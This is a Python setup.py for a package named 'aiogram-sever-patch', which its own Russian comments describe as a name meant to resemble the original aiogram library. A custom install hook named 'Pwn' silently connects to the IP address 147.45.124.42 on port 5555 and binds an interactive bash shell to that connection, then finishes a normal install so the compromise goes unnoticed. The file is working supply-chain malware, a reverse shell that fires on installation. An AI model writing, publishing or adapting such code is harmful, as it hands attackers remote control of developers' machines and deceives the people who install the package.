from setuptools import setup
from setuptools.command.install import install
import os, socket, subprocess

class Pwn(install):
    def run(self):
        # Твой реверс-шелл к Убунту
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(("147.45.124.42",5555))
            os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
            p=subprocess.call(["/bin/bash","-i"])
        except:
            pass
        install.run(self)

setup(
    name="aiogram-sever-patch", # Название должно быть похожим на оригинал
    version="3.3.7",
    cmdclass={'install': Pwn},
)
